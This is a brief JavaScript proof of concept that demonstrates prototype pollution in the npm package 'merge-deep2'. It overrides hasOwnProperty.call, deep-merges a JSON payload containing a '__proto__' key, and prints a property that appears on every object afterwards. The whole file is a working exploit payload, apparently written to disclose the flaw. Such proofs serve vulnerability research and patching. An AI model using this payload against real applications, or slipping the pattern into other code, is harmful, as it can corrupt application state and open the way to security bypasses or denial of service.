Object.prototype.hasOwnProperty.call = () => true;
const mergeDeep2 = require('merge-deep2');
let obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
mergeDeep2({}, JSON.parse(malicious_payload), true);
console.log({}.polluted);